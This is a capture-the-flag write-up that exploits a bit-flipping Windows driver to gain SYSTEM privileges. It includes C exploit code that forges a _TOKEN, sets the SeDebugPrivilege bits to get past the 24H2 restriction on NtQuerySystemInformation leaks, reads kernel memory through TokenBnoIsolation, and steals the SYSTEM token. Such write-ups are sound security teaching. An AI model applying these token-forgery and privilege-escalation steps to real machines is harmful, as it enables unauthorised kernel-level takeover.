# Process Flipper

##  Brief Introduction

This is a windows kernel exploit challenge, the goal is to reach SYSTEM privilege to read the flag from `C:\flag.txt` via `ProcessFlipper.sys`. Analyzing this file, we can see there're 2 IOCTL handlers: one will turn on a bit and the other will turn off a bit, both interactions only affect on current process's `_EPROCESS`, which mean we're having an arbitrary write on `_EPROCESS` because we can modify anything within this range.

## Initial Steps

My first thought was to attack `_TOKEN` structure since it's one of a really powerful field that can produce really strong primitives.

```c
void arbWrite(int offset, DWORD64 val, DWORD size) {
	BYTE inputBuf[0x10] = { 0 };

	for (int i = 0; i < size; i++) {
		BYTE cVal = ((val >> (8 * i)) & 0xff);

		for (int j = 0; j < 8; j++) {
			*(DWORD64*)inputBuf = ((offset + i) << 3) + j;

			if (((cVal >> j) & 1) != 0)
				DeviceIoControl(hDevice, IOCTL_TURN_ON_BIT, inputBuf, 4, NULL, NULL, NULL, NULL);
			else DeviceIoControl(hDevice, IOCTL_TURN_OFF_BIT, inputBuf, 4, NULL, NULL, NULL, NULL);
		}
	}
}

...

DWORD64 fakeToken = (DWORD64)VirtualAlloc((LPVOID)0x1000000, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
if (fakeToken != 0x1000000) {
    puts("[-] VirtualAlloc failed");
    return -1;
}

...

arbWrite(0x248, 0x1000038, 8);

...
```

I allocated a buffer at address `0x1000000`, and overwrite the token with `0x1000038`. This works because as of right now, SMAP hasn't been available to Windows, which enable us to control this field under usermode address, and the reason why I choose this specific address will be discussed later.

We need to explore some of the mechanisms of `_TOKEN` structure in order to gain desired primitives:

### Arbitrary Read

In `NtQueryInformationToken`, when we query `TokenBnoIsolation`:

```c
if ( TokenInformationClass == TokenBnoIsolation )
{
    LOBYTE(TokenInformation) = PreviousMode;
    result = SepReferenceTokenByHandle(
                v8,
                8,
                (int)TokenInformation,
                TokenInformationLength,
                (PVOID *)&Object,
                (__int64)&v148,
                (__int64)&DestinationSid);  // --- [1]
    if ( result < 0 )
        return result;
    v136 = KeGetCurrentThread();
    --v136->KernelApcDisable;
    v47 = Object;
    ExAcquireResourceSharedLite(Object->TokenLock, 1u);
    v137 = 16;
    BnoIsolationHandlesEntry = v47->BnoIsolationHandlesEntry;
    if ( BnoIsolationHandlesEntry )
        v137 = BnoIsolationHandlesEntry->EntryDescriptor.IsolationPrefix.MaximumLength + 16;
    *v12 = v137;
    if ( TokenInformationLength < v137 )
        goto LABEL_97;
    if ( v47->BnoIsolationHandlesEntry )
    {
        v6[8] = 1;
        *(_QWORD *)v6 = v6 + 16;
        memmove(
        v6 + 16,
        v47->BnoIsolationHandlesEntry->EntryDescriptor.IsolationPrefix.Buffer,
        v47->BnoIsolationHandlesEntry->EntryDescriptor.IsolationPrefix.MaximumLength);      // --- [2]
    }
    else
    {
        v6[8] = 0;
        *(_QWORD *)v6 = 0LL;
    }
    goto LABEL_157;
}
```

At `[1]`, it'll obtain our `_TOKEN` via user's provided handle value, and stored it in `Object`. After some sanity checking and locking, it'll copy a buffer from `_TOKEN` back to user. Since we can modify pointers in `_TOKEN`, we can set this buffer pointer to a targeted address and the length of data we want to read.

### Bring back NtQuerySystemInformation to life

But because the challenge is running on the latest `Windows 24H2`, leak tricks like `NtQuerySystemInformation` will not work anymore, so we need to find a way to leak `_EPROCESS` address to make our arbitrary read userful.

Examining `NtQuerySystemInformation` when query `SystemExtendedHandleInformation`:

```c
BOOLEAN __stdcall SeSinglePrivilegeCheck(LUID PrivilegeValue, KPROCESSOR_MODE PreviousMode)
{
    ...
    v6 = SepPrivilegeCheck((_DWORD)ClientToken, (unsigned int)&v27, 1, 1, PreviousMode);    // --- [3]
    ...
}

__int64 __fastcall ExIsRestrictedCaller(KPROCESSOR_MODE a1, _DWORD *a2)
{
    unsigned int v2; // edi
    BOOLEAN v5; // bl
    struct _SECURITY_SUBJECT_CONTEXT SubjectContext; // [rsp+50h] [rbp-28h] BYREF
    NTSTATUS AccessStatus; // [rsp+80h] [rbp+8h] BYREF
    ACCESS_MASK GrantedAccess; // [rsp+88h] [rbp+10h] BYREF

    v2 = 0;
    AccessStatus = 0;
    GrantedAccess = 0;
    memset(&SubjectContext, 0, sizeof(SubjectContext));
    if ( a2 )
    *a2 = 0;
    if ( !a1 )
    return 0LL;
    if ( a2 && (unsigned int)Feature_H2E_WPA3SAE__private_IsEnabledDeviceUsage_1() )
    *a2 = SeSinglePrivilegeCheck(SeDebugPrivilege, a1) == 0;    // --- [2]
    SeCaptureSubjectContext(&SubjectContext);
    v5 = SeAccessCheck(
            SeMediumDaclSd,
            &SubjectContext,
            0,
            0x20000u,
            0,
            0LL,
            (PGENERIC_MAPPING)&ExpRestrictedGenericMapping,
            1,
            &GrantedAccess,
            &AccessStatus);     // --- [4]
    SeReleaseSubjectContext(&SubjectContext);
    if ( !v5 )
    return 1LL;
    LOBYTE(v2) = AccessStatus < 0;
    return v2;
}

...
if ( (a4 & 7) == 0 )
{
    LOBYTE(v12) = AccessMode;
    if ( !(unsigned int)ExIsRestrictedCaller(v12, &v226, v15, v13) )    // --- [1]
    {
        ObjectInformation = ExpGetHandleInformationEx(v226, a4, Length, &v219);
        v28 = 5LL;
        goto LABEL_99;
    }
    return -1073741790;
}
...
```

The code will reach at `[1]` first, this call is being added only to this version of windows to prevent attackers abusing `NtQuerySystemInformation`.

Analyzing this function further, it'll reach `[2]` then `[3]` to call `SepPrivilegeCheck`. This code will get `_TOKEN->Privileges.Enabled` and `_TOKEN->Privileges.Present` AND each other and check if the bit of `SeDebugPrivilege` is enable in both of these fields. After this check, it'll come to `[4]` to check whether our process is in Medium integrity.

To summarize, `NtQuerySystemInformation` will only enable to process that has Medium integrity and `SeDebugPrivilege`, which users from `Administration` account higher has this. Since our process is ran at Medium integrity, we only need to find a way to bypass the `SeDebugPrivilege` check to gain this leak primitive. Luckily for us, this check performs on `_TOKEN` structure, at `Privileges.Enabled` and `Privileges.Present` fiedls, which we can entirely control.

So to enable `NtQuerySystemInformation`, we just need to set `_TOKEN->Privileges.Enabled` and `_TOKEN->Privileges.Present` to have `SeDebugPrivilege` bit:

```c
*(DWORD64*)(fakeToken + 0x30 + 0x40) = 0xffffffffffffffff;	// enable SeDebugPrivilege
*(DWORD64*)(fakeToken + 0x30 + 0x48) = 0xffffffffffffffff;	// enable SeDebugPrivilege
*(DWORD64*)(fakeToken + 0x30 + 0x50) = 0xffffffffffffffff;	// enable SeDebugPrivilege
```

We need to make space for the first 0x30 bytes of our fake token, because at some point, the code will call `ObfDereferenceObjectWithTag` on our token:

```c
LONG_PTR __stdcall ObfDereferenceObjectWithTag(PVOID Object, ULONG Tag)
{
  v2 = (_OBJECT_HEADER *)((char *)Object - 48);
  if ( ObpTraceFlags )
    ObpPushStackInfo(v2, 0, 1u, Tag);
  v4 = _InterlockedExchangeAdd64(&v2->PointerCount, 0xFFFFFFFFFFFFFFFFuLL); 
  v5 = v4 <= 1;
  BugCheckParameter4 = v4 - 1;
  if ( !v5 )
    return BugCheckParameter4;
  ...
}
```

There's a reference count in this object at offset `-0x30`, we need to put a value at this offset to prevent BSOD happening.

And after gaining desired primitives, we just need to replace current fake token with System's token and get the flag:

```c
*(WORD*)(fakeBuf + 0x2a) = 0x10;		// fake size
systemEproc = leakEproc(4);
*(DWORD64*)(fakeBuf + 0x30) = (DWORD64)(systemEproc + 0x248);		// fake buffer

ULONG returnLen = 0;
BYTE tokenInfo[0x100] = { 0 };
ntQueryInformationToken(GetCurrentProcessToken(), TokenBnoIsolation, (PVOID)tokenInfo, 0x100, &returnLen);

DWORD64 systemToken = *(DWORD64*)(tokenInfo + 0x10);
arbWrite(0x248, systemToken, 8);

system("notepad.exe C:\\flag.txt");
```

## Reference:
https://starlabs.sg/blog/2023/11-exploitation-of-a-kernel-pool-overflow-from-a-restrictive-chunk-size-cve-2021-31969/#arbitrary-readwrite

https://windows-internals.com/kaslr-leaks-restriction/